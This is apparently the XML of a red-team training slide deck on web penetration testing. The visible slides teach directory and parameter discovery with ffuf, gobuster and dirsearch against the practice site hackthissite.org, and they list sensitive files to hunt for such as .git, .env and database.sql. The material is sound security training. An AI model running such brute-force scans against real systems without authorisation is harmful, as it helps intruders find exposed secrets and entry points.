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notesMasterIdLst>
    <p:notesMasterId r:id="rId40"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId2"/>
    <p:sldId id="315" r:id="rId3"/>
    <p:sldId id="267" r:id="rId4"/>
    <p:sldId id="320" r:id="rId5"/>
    <p:sldId id="282" r:id="rId6"/>
    <p:sldId id="283" r:id="rId7"/>
    <p:sldId id="280" r:id="rId8"/>
    <p:sldId id="284" r:id="rId9"/>
    <p:sldId id="287" r:id="rId10"/>
    <p:sldId id="279" r:id="rId11"/>
    <p:sldId id="302" r:id="rId12"/>
    <p:sldId id="288" r:id="rId13"/>
    <p:sldId id="278" r:id="rId14"/>
    <p:sldId id="289" r:id="rId15"/>
    <p:sldId id="276" r:id="rId16"/>
    <p:sldId id="294" r:id="rId17"/>
    <p:sldId id="293" r:id="rId18"/>
    <p:sldId id="319" r:id="rId19"/>
    <p:sldId id="286" r:id="rId20"/>
    <p:sldId id="290" r:id="rId21"/>
    <p:sldId id="313" r:id="rId22"/>
    <p:sldId id="307" r:id="rId23"/>
    <p:sldId id="257" r:id="rId24"/>
    <p:sldId id="321" r:id="rId25"/>
    <p:sldId id="308" r:id="rId26"/>
    <p:sldId id="306" r:id="rId27"/>
    <p:sldId id="258" r:id="rId28"/>
    <p:sldId id="304" r:id="rId29"/>
    <p:sldId id="309" r:id="rId30"/>
    <p:sldId id="261" r:id="rId31"/>
    <p:sldId id="303" r:id="rId32"/>
    <p:sldId id="272" r:id="rId33"/>
    <p:sldId id="310" r:id="rId34"/>
    <p:sldId id="270" r:id="rId35"/>
    <p:sldId id="322" r:id="rId36"/>
    <p:sldId id="323" r:id="rId37"/>
    <p:sldId id="297" r:id="rId38"/>
    <p:sldId id="31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3162"/>
    <a:srgbClr val="147E14"/>
    <a:srgbClr val="364CBA"/>
    <a:srgbClr val="00F629"/>
    <a:srgbClr val="CE5DD1"/>
    <a:srgbClr val="005D7E"/>
    <a:srgbClr val="8F51E9"/>
    <a:srgbClr val="9F2EA2"/>
    <a:srgbClr val="3DD818"/>
    <a:srgbClr val="2687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00" autoAdjust="0"/>
    <p:restoredTop sz="92701" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr>
        <p:scale>
          <a:sx n="66" d="100"/>
          <a:sy n="66" d="100"/>
        </p:scale>
        <p:origin x="10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926F-1DE9-406A-ACC1-8BA722BAA6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30C0F-AA01-407F-BFE5-3AB38B869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30C0F-AA01-407F-BFE5-3AB38B8693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37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55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0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4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85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4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4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05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40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55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2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298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4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1129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78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985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8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0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thissite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ckthissite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hackthissite.org/search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pscanteam/VulnerableWordPress.gi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" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/wpscanteam/VulnerableWordPress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" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://target-site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81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805" y="2606627"/>
            <a:ext cx="2124221" cy="87071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</a:rPr>
              <a:t>Week 3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5391" y="3829031"/>
            <a:ext cx="3920196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00F629"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Prepared by Umar </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00F629"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Niaz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00F629"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00F629"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Red Team Trainer at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00F629"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cyberster</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00F6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59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458700" cy="1450757"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Vulnerability Assessment, Initial Exploitation &amp; Web Application Penetration Testing (OWASP Top 10)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0757"/>
            <a:ext cx="12192000" cy="5407243"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0"/>
              <a:t>Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0"/>
              <a:t>To master the process of mapping discovered services to known vulnerabilities (CVEs), performing the first stage of a successful exploit to gain a foothold, and identifying and exploiting the most common web-based vulnerabilities using industry-standard tools and manual techniques.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0464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570346" cy="1293028"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Task 01: Advanced Web Directory &amp; Parameter Discovery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3028"/>
            <a:ext cx="12075794" cy="4555066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Description</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0"/>
              <a:t>Find the hidden "Entry Points" of a web application.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0"/>
              <a:t>Technical Requirements</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0"/>
              <a:t>○ Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0" err="1"/>
              <a:t>ffuf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0" err="1"/>
              <a:t>Dirsearch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0"/>
              <a:t>, or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0" err="1"/>
              <a:t>Gobuster</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0"/>
              <a:t> to perform directory brute-forcing using the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0" err="1"/>
              <a:t>SecLists</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0"/>
              <a:t> wordlist.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0"/>
              <a:t>○ Identify hidden directories (e.g., /admin, /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0" err="1"/>
              <a:t>config</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0"/>
              <a:t>, /dev, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0" err="1"/>
              <a:t>git</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0"/>
              <a:t>○ Use Arjun or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0" err="1"/>
              <a:t>ParamSpider</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0"/>
              <a:t> to find hidden URL parameters (e.g., ?id=, ?file=, ?page</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0" smtClean="0"/>
              <a:t>=).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7131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Target :- hackthissite.org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7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948" y="0"/>
            <a:ext cx="9063372" cy="118126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Task 01: Advanced Web Directory &amp; Parameter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4" y="1181268"/>
            <a:ext cx="12094845" cy="5410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 Directory </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Brute-Forcing (Finding Hidden Paths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Websites usually hide sensitive paths like</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean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/admin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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>config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/dev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/test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/.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>git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/backup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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>api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/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>staging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Directory brute forcing tries thousands of possible paths automatically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295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130629" y="87086"/>
            <a:ext cx="11654972" cy="6770914"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="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Tool 1 — FFUF (Fast Web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Fuzzer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Very fast and commonly used in bug bounty.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Install </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Seclists</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> wordlist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rgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> apt update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rgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> apt install </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>seclists</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ffuf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -u https://hackthissite.org/FUZZ \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-w /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>usr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/share/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>seclists</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/Discovery/Web-Content/common.txt \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-fc 404 -s</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="0"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Explanation: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00F629"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Example result:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="CE5DD1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These are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0"/>
              <a:t>interesting attack surfaces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601767"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="0" y="3173781"/>
          <a:ext cx="32639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11">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1473788512"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2546489">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2864933224"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="219709">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" dirty="0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611763"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="245554">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>FUZZ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placeholder for wordlist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648922"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="128775">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>-w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wordlist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337954"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="245554">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" dirty="0"/>
                        <a:t>-u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target URL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4702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285099"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="0" y="4934739"/>
          <a:ext cx="3441700" cy="125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50">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3812831519"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1720850">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3400162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admin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smtClean="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="ui-monospace"/>
                        </a:rPr>
                        <a:t>[Status: 200]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056073"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="32842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config</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" dirty="0" smtClean="0"/>
                        <a:t>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[Status: 403]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520851"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="32842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[Status: 200]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764252"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="32842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backup.zip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[Status: 200]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189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74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7512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3DD818"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Filter Only Valid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ffuf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -u http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>://hackthissite.org/FUZZ  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>\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-w /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>usr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/share/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>seclists</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/Discovery/Web-Content/common.txt \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-fc 404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Removes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>404 responses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to reduce noise.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Tool 2 —Directory Discovery Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Dirsearch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clone https://github.com/maurosoria/dirsearch.git --depth 1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chmod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>+x </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>dirsearch-linux-amd64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 err="1"/>
              <a:t>dirsearch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -u </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://hackthissite.org</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>\-w /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>usr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/share/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>seclists</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/Discovery/Web-Content/common.txt </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2333888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1537"/>
            <a:ext cx="12192000" cy="6854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 smtClean="0"/>
              <a:t>Tool </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>2 — Gobuster</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Popular for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>directory and DNS brute forcing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1900" b="1" dirty="0"/>
              <a:t>Basic Directory </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0"/>
              <a:t>Scan</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>gobuster </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1"/>
              <a:t>dir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t> -u https://hackthissite.org \</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>-w /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1"/>
              <a:t>usr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>/share/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1"/>
              <a:t>seclists</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>/Discovery/Web-Content/common.txt \</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>-t 50 \</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>--exclude-length </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0"/>
              <a:t>272</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" smtClean="0"/>
              <a:t>Example </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>output</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" smtClean="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>/admin</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>/uploads</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>config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/dev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384" y="2520157"/>
            <a:ext cx="5598231" cy="415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3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31" y="114299"/>
            <a:ext cx="12241400" cy="70461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DD818"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tool 3 — </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="3DD818"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Dirsearch</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="3DD818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 smtClean="0"/>
              <a:t>More </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>automated and detects: extensions , backup files , interesting responses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Basic </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" smtClean="0"/>
              <a:t>Scan</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" smtClean="0"/>
              <a:t>Pre-required things</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>pip install </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>defusedxml</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>setuptools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pip install -r </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" smtClean="0"/>
              <a:t>requirements.txt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>pip install </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>pyparsing</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1" smtClean="0"/>
              <a:t>dirsearch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" smtClean="0"/>
              <a:t> -u https://hackthissite.org</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" smtClean="0"/>
              <a:t>Or</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" smtClean="0"/>
              <a:t>python3 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>dirsearch.py -u http://target.com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Scan With File Extensions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python3 dirsearch.py -u </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>hackthissite.org</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" smtClean="0"/>
              <a:t>  -e </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1" smtClean="0"/>
              <a:t>php,html,js,zip,txt,sql</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="19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 smtClean="0"/>
              <a:t>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 err="1"/>
              <a:t>dirsearch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t> -u https://hackthissite.org -e </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>php,html,js,zip,txt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046" y="1124945"/>
            <a:ext cx="5316914" cy="36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058400" cy="6229350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may discover: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   backup.zip                           </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>database.sql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  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>config.php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  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>test.php</a:t>
            </a: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3DD818"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>2 Important Hidden Files to Look For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Common sensitive files:</a:t>
            </a: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.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git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.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env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.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htaccess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robots.txt</a:t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backup.zip</a:t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database.sql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config.php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debug.log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Example:</a:t>
            </a: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http://target.com/.git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Sometimes entire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source code leaks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-1"/>
            <a:ext cx="12309231" cy="671028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1900" dirty="0"/>
              <a:t>3 Hidden Parameter Discovery</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Many vulnerabilities exist inside hidden parameters.</a:t>
            </a:r>
          </a:p>
          <a:p>
